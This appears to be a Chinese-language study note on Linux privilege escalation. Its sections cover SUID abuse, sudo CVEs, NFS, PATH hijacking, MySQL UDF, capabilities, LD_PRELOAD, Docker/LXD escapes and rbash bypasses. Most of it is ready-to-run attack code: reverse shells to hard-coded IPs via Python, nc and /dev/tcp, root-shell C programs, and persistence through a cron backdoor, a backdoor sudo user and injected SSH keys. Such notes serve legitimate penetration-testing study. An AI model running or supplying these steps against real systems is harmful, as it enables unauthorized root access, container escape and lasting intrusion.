---
title: Linux提权
date: 2026-03-06
updated: 2026-03-06
tags:
  - 安全基础
categories:
  - 安全相关
description: Linux提权
published: true
---

```bash
# 收集当前系统信息的命令
hostnamectl
cat /etc/os-release	# 系统配置目录
lsb_release -a	# Linux 标准基础（LSB）信息

# 不同Linux系统会将版本号相关配置文件放在不同的文件
cat /etc/redhat-release
cat /etc/centos-release
cat /etc/lsb-release
cat /etc/*-release	# *

cat /etc/issue

uname -a
cat /proc/version	# 内核运行时在内存中生成的"状态快照"
dmesg | grep "Linux version"	# 内核的"环形缓冲区"（ring buffer），也就是系统启动时内核打印的日志消息，取Linux版本这部分
```

一些经典内核漏洞 dirtycow，Pwnkit，Dirty Pipe，SUDO，大脏牛

## SUID&SUDO

SUID（Set User ID）是一种文件权限位，主要用于让普通用户在执行某个程序时，临时以文件所有者（通常是 root）的身份运行该程序。执行文件时，进程的有效 UID（Effective UID）变为文件所有者的 UID。

eg：find 命令若被赋予了 root 权限，那么调用 `find . -exec '/bin/sh' -p \;` 即 find 后面所跟参数的命令也会享有 root 权限。

> https://gtfobins.github.io/

```bash
# 全系统搜索带有特殊通行证的文件
find / -perm -u=s -type f 2>/dev/null	# 查找具有 SUID 权限的可执行文件的常用命令
find / -perm -g=s -type f 2>/dev/null	# 查找的是具有SGID (Set Group ID)权限的文件
```

示例：

```bash
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.131",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
/usr/bin/mawk 'BEGIN {system("/bin/sh")}'
```

SUDO root 把本来只能超级用户执行的命令赋予普通用户执行

```bash
# CVE-2019-14287 sudo 1.8.28 之前，-u正常应填入用户名或ID 但-u#-1（用户 ID 为 -1），sudo的内部逻辑会出错，误以为你是要以root（ID 0）身份运行
sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
```

CVE-2021-3156

sudo -v：1.8.2 - 1.8.31p2，1.9.0 - 1.9.5p1

缓冲区溢出，sudo 记录了可执行用户名，若输入该用户名过长就会导致多出来的字符覆盖到旁边的权限判断去，从而误认为 root 放行

```bash
# 判断方式，若报错则可能存在漏洞
sudoedit -s /
# 以其他用户身份编辑文件，指定一个"安全策略插件"，故意传入根目录作为文件名
```

## NFS 服务配置不当

NFS 一种基于 TCP/IP 传输网络文件系统协议，通过使用 NFS 协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源。

提权条件：NFS 服务开启和 web/用户权限利用

```bash
# 枚举目标机器的 NFS 共享目录
showmount -e xxx.xxx.xxx.xxx

# 在攻击者机器上创建本地挂载点
mkdir nfs

# 将目标的 NFS 共享挂载到本地
mount -t nfs xxx.xxx.xxx.xxx:/mnt/nfs ./nfs

# 在挂载目录中创建文件并设置权限
chmod 777 shell.php
```

```c
#include<stdlib.h>
#include<unistd.h>

int main()
{
    setuid(0);
    system("id");
    system("/bin/bash");
}
```

```bash
# 编译 C 代码
gcc getroot.c -o getroot

# 复制到 NFS 挂载目录（实际是目标机器的共享目录）
cp getroot /root/nfs

# 设置 SUID 权限
chmod +s getroot

# 攻击机器操作
find / -perm -u=s -type f 2>/dev/null  # 先确认 getroot 的 SUID 是否设置成功

# 目标机操
cd /mnt/nfs          # 进入 NFS 挂载点（共享目录在目标机上的位置）
./getroot            # 执行恶意程序
```

安全问题，本地文件赋予什么权限，同步过去的文件同样也拥有什么权限，从而导致提权（文件属性同步问题导致）

## 计划任务提权

不是操作计划任务，是操作计划任务里面调用的程序/脚本，通过操作已有计划任务里面要执行的内容来提权，看已有计划任务调用的文件是否可以控制，能控制就能提权。

## 利用环境变量提权

一个具有 sudo 权限的用户自定义一个目录，可以默认执行 curl 命令，curl 命令在系统环境变量中，将/bin/sh 写入 curl 文件中，添加环境变量为当前目录下的拼接原始的环境变量，导致在执行 curl 命令时执行的是当前文件夹下的 curl 文件中的内容，从而成功提权

```bash
# 查看当前 PATH
echo $PATH
# eg：
/opt/statuscheck
strings /opt/statuscheck
# strings命令：显示二进制文件中可打印的字符串，看看这个程序内部调用了哪些外部命令

# eg：
# curl
# http://example.com/status

# PATH 劫持攻击
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
echo $PATH
# 执行目标程序，触发提权
```

## 数据库 UDF 提权

User Defined Function（用户自定义函数），通过 MySQL 数据库的"插件机制"，把自己写的恶意代码（`.so` 文件）"安装"到数据库里，然后像调用普通 SQL 函数一样，执行系统命令，从而获得服务器控制权。

```bash
# 搜索 UDF 相关利用代码
searchsploit udf

# 复制 Exploit 代码到当前目录
cp /usr/share/exploitdb/exploits/linux/local/1518.c .

# 编译成共享库（.so 文件）
gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc

# 启动简易 HTTP 服务器，方便目标下载
python -m http.server 8080
```

```bash
# 登录 MySQL（已知 root 密码）
mysql -uroot -pR@v3nSecurity

# 信息收集命令
select version();              # 查 MySQL 版本
select @@basedir;              # 查 MySQL 安装根目录
show variables like '%basedir%';   # 确认安装路径
show variables like '%secure%';    # 查 secure_file_priv（文件导出限制）
show variables like '%plugin%';    # 查插件加载路径
show variables like '%compile%';   # 查系统编译信息
```

```sql
-- 理想情况
secure_file_priv = '' 或 '/tmp'  -- 允许导出文件
plugin_dir = '/usr/lib/mysql/plugin/'  -- 知道插件放哪
```

```sql
-- 切换到 mysql 系统库
use mysql;

-- 创建临时表，用于存储二进制数据
create table udflist(line blob);

-- 把 /tmp/udf.so 文件内容读入表中
insert into udflist values(load_file('/tmp/udf.so'));

-- 把表中的二进制数据导出到插件目录
select * from udflist into dumpfile '/usr/lib/mysql/plugin/udf.so';

-- 创建自定义函数 do_system，关联 udf.so
create function do_system returns integer soname 'udf.so';

-- 提权，调用函数执行反弹 Shell
select do_system('nc 192.168.10.131 6666 -e /bin/bash');
```

## 利用 Capability 提权

> https://www.cnblogs.com/f-carey/p/16026088.html

Capability 针对不同能力的精细化控制，不同用户所能控制系统的权限不同，eg：允许改变用户 ID 或组 ID，允许跟踪任意进程等

> - Effective（有效）：当前实际生效的能力
> - Permitted（允许）：进程可以使用的能力集合
> - Inheritable（可继承）：子进程能继承的能力
> - `+ep` 表示：设置 Effective + Permitted，即"立即生效 + 允许使用"

```bash
# 查看单个文件的能力
getcap /usr/bin/php

# 递归查看整个系统的能力（推荐）
getcap -r / 2>/dev/null

# 给文件设置能力
setcap cap_setuid+ep /tmp/php

# 删除文件的能力
setcap -r /tmp/php
```

示例：

```bash
# 复制 php 到可写目录（防止原文件被保护）
cp /usr/bin/php /tmp/php

# 设置 cap_setuid 能力
setcap cap_setuid+ep /tmp/php

# 利用，在有setuid能力的情况下，更改当前用户uid，执行命令
/tmp/php -r "posix_setuid(0); system('id');"
```

其他语言类似

```bash
# Python
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh"'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

## LD_PRELOAD 环境变量注入

> https://www.cnblogs.com/backlion/p/10503985.html

`.so` Linux 动态链接库，LD_Preload，看是否有文件以特权模式启动，让一个程序执行的时候加载指定链接库文件。

> 攻击者思路：
> 1. 写一个恶意库，里面有个函数叫 `_init()`（库加载时自动执行）
> 2. `_init()` 里调用 `setuid(0)` 变成 root
> 3. 用 LD_PRELOAD 让 sudo 运行的程序"先加载"这个恶意库

依赖 sudo 服务**配置缺陷**，导致原本应当被 sanitization（清理/过滤）的危险环境变量 `LD_PRELOAD` 被保留并传递给特权进程，从而允许攻击者劫持特权程序的动态链接过程。

```bash
sudo -l
# 前提条件
Defaults        env_keep += LD_PRELOAD
test  ALL=(ALL:ALL) NOPASSWD: /usr/bin/find
# LD_PRELOAD作为一个特殊的环境变量用于指定一个或多个共享对象.so，链接器在加载任何库之前优先加载这些对象
```

两种方法：
1. 符号拦截：定义与系统同名的函数（eg：system、printf）
2. 利用 ELF 文件的初始化机制，在库被加载时自动执行特定代码

```c
// 示例
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

// ELF 初始化函数，在共享库被加载到进程地址空间时自动执行
void _init() {
    unsetenv("LD_PRELOAD");  // 清除环境变量，防止递归加载导致栈溢出或异常
    setgid(0);               // 将有效组 ID (EGID) 设置为 0 (root)
    setuid(0);               // 将有效用户 ID (EUID) 设置为 0 (root)
    system("/bin/sh");       // 派生一个交互式 Shell 进程
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles	# 编译

sudo LD_PRELOAD=/tmp/shell.so find	# 执行
```

## 虚拟化技术

### LXC 容器

LXD（Linux 容器守护程序）系统容器管理器，基于 LXC（Linux 容器）技术。

若当前用户可以操作容器，用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。（用户属于 LXD 组）

```bash
# 导入本地镜像文件，并命名为 `test`
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test
# 创建容器实例，开启特权模式（关闭用户命名空间隔离）
lxc init test test -c security.privileged=true
# 添加磁盘设备，将宿主机 / 挂载到容器 /mnt/root
lxc config device add test test disk source=/ path=/mnt/root recursive=true
# 启动容器
lxc start test
# 在容器内执行shell
lxc exec test /bin/sh
# 进入挂在宿主机root用户目录
cd /mnt/root/root	# 成功逃逸
```

### Docker 容器

任何能够与 Docker 守护进程（`dockerd`）进行通信的用户，实质上拥有与 root 等效的系统权限。（用户属于 docker 组）

```bash
# 启动 Alpine 容器，挂载宿主机根目录，并进入交互式终端
docker run -v /:/mnt -it alpine
# 进入挂载的宿主机根目录即可读取根目录内容
cd /mnt/root
```

检测是否在容器内

```bash
#!/bin/bash
is_container() {
    # cgroup 检测
    if grep -qiE 'docker|containerd|lxc|kubepods' /proc/1/cgroup 2>/dev/null; then
        return 0
    fi
    
    # 特殊文件检测
    if [ -f /.dockerenv ] || [ -f /run/.containerenv ]; then
        return 0
    fi
    
    # 挂载点检测
    if mount | grep -q 'overlay\|aufs\|devicemapper'; then
        return 0
    fi
    
    # 进程检测
    if ps -p 1 -o comm= | grep -qE 'init|systemd|docker|containerd'; then
        return 1  # 可能是宿主机
    fi
    
    return 1
}

is_container && echo "Is Container" || echo "Not Container"

# 判断是否为特权模式
cat /proc/self/status | grep CapEff
# 非特权容器（默认）：
# CapEff:	00000000a80425fb
# 特权容器：
# CapEff:	0000003fffffffff

# 查看磁盘挂载信息
fdisk -l	# （其中一种方式）
```

提权&持久化访问：

- 破解 `/etc/shadow`

- 写到宿主机 ssh 秘钥

```bash
# 生成攻击者 SSH 密钥对（攻击者机器）
ssh-keygen -t rsa -b 4096 -f ~/.ssh/container_escape -N ""

# 在容器内写入宿主机 authorized_keys
# 假设宿主机 /root 挂载到 /host/root
echo "ssh-rsa AAAA... attacker@kali" >> /host/root/.ssh/authorized_keys

# 修复权限（如果必要）
chmod 600 /host/root/.ssh/authorized_keys
chown root:root /host/root/.ssh/authorized_keys

# 从攻击者机器登录宿主机
ssh -i ~/.ssh/container_escape root@host_ip
```

- 写到宿主机计时任务

```bash
# 创建恶意 cron 任务
# 假设宿主机 /etc 挂载到 /host/etc
echo '* * * * * root /tmp/backdoor.sh' > /host/etc/cron.d/escape

# 创建后门脚本
cat > /host/tmp/backdoor.sh << 'EOF'
#!/bin/bash
# 反弹 Shell 到攻击者
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# 或更隐蔽：添加用户
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:password' | chpasswd
EOF

chmod +x /host/tmp/backdoor.sh
# 等待执行
```

- cve 漏洞直接反弹

> https://mp.weixin.qq.com/s/tk5Ya8DzoKQTgqkotr_dkQ

## Rbash 绕过

> https://xz.aliyun.com/t/7642

- 利用非受限程序执行命令
	- 解释器调用 (python/perl/awk)
	- 编辑器逃逸 (vim/less/nano)
	- 其他 Shell 启动 (sh/bash -i)

```bash
# AWK 绕过
awk 'BEGIN {system("/bin/bash")}'

# Python 绕过
python -c 'import os; os.system("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl 绕过
perl -e 'exec "/bin/bash"'

# Ruby 绕过
ruby -e 'exec "/bin/bash"'

# Vim 逃逸
vim -c ':py3 import os; os.execv("/bin/bash", ["bash"])'
# 或进入 Vim 后：
# :set shell=/bin/bash
# :shell

# Less/More 逃逸
less /etc/passwd
# 输入：! /bin/bash

# Nano 逃逸
nano
# Ctrl+R → Ctrl+X → 输入：/bin/bash
```

- 利用 PATH 环境变量
	- 写入可写目录到 PATH
	- 创建同名命令覆盖

```bash
# 确认 PATH 是否可修改（部分 Rbash 配置允许）
echo $PATH
export PATH=/tmp:$PATH  # 如果成功，则可继续

# 在可写目录创建恶意命令
cd /tmp
echo '/bin/bash' > ls   # 创建名为 "ls" 的脚本
chmod +x ls

# 执行"伪装"命令
ls  # 实际执行的是 /tmp/ls → 启动非受限 bash
```

- 利用命令替换与子进程
	- `$(...)` 语法
	- 通过受限命令间接执行

```bash
# 通过允许的命令间接执行
# 假设允许执行 find，但限制参数
find . -exec /bin/bash \;  # 如果 -exec 未被禁用

# 利用命令替换语法
bash -c 'echo $(/bin/bash)'  # 部分配置下可绕过
```

- 利用配置文件加载
	- ~/.bashrc / ~/.profile 注入
	- ENV 变量指向恶意脚本

```bash
# Bash 启动时会按顺序加载配置文件（`/etc/profile` → `~/.bash_profile` → `~/.bashrc` 等）

# 前提：可写 ~/.bashrc（通常可以，因为是用户自己的文件）

# 在 ~/.bashrc 末尾添加：
echo 'unset -o restricted 2>/dev/null; exec /bin/bash' >> ~/.bashrc

# 重新登录或启动新 Shell
# 加载 ~/.bashrc 时：
# - unset -o restricted 尝试关闭受限模式（部分 Bash 版本支持）
# - exec /bin/bash 替换当前进程为非受限 Shell

# 3. 验证
$ echo $SHELLOPTS
# 不再包含 "restricted"


# 前提：可设置 ENV 环境变量（部分 Rbash 配置允许）

# 创建恶意脚本
echo '/bin/bash -i' > /tmp/.evil.sh
chmod +x /tmp/.evil.sh

# 设置 ENV 变量
export ENV=/tmp/.evil.sh

# 触发非交互式 Shell（如通过 cron、sudo 执行脚本）
# 当 Bash 以非交互模式启动时：
# - 读取 $ENV 指向的文件
# - 执行 /bin/bash -i → 启动交互式非受限 Shell
```